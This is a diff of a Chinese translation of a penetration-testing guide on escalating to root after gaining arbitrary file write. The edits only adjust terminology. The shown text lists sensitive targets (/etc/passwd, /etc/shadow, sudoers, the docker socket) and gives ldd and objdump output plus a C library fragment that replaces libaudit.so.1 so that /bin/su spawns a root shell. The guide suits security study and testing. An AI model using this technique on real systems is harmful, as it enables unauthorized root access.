@@ -48,14 +48,14 @@ return 0;
 
 ### 常见文件
 
-- 在 _/etc/passwd_ 中添加带密码的用户
+- 向 _/etc/passwd_ 中添加带密码的用户
 - 修改 _/etc/shadow_ 中的密码
 - 在 _/etc/sudoers_ 中将用户添加到 sudoers
 - 通过 docker socket 滥用 docker，通常位于 _/run/docker.sock_ 或 _/var/run/docker.sock_
 
-### 覆盖库
+### 覆盖 library
 
-检查某个二进制文件使用的库，本例中为 `/bin/su`：
+检查某个 binary 使用的 library，本例中为 `/bin/su`：
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -76,7 +76,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-符号 `audit_open`、`audit_log_acct_message`、`audit_log_acct_message` 和 `audit_fd` 可能来自 libaudit.so.1 库。由于 libaudit.so.1 将被恶意共享库覆盖，因此这些符号应存在于新的共享库中，否则程序将无法找到相应符号并退出。
+符号 `audit_open`、`audit_log_acct_message`、`audit_log_acct_message` 和 `audit_fd` 可能来自 `libaudit.so.1` library。由于 `libaudit.so.1` 将被恶意 shared library 覆盖，因此这些符号应存在于新的 shared library 中，否则程序将无法找到该符号并退出。
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -98,9 +98,9 @@ setgid(0);
 system("/bin/bash");
 }
 ```
-现在，只需调用 **`/bin/su`**，你就可以获得一个 root shell。
+现在，只需调用 **`/bin/su`**，即可获得一个 root shell。
 
-## Scripts
+## 脚本
 
 你能让 root 执行某些内容吗？
 
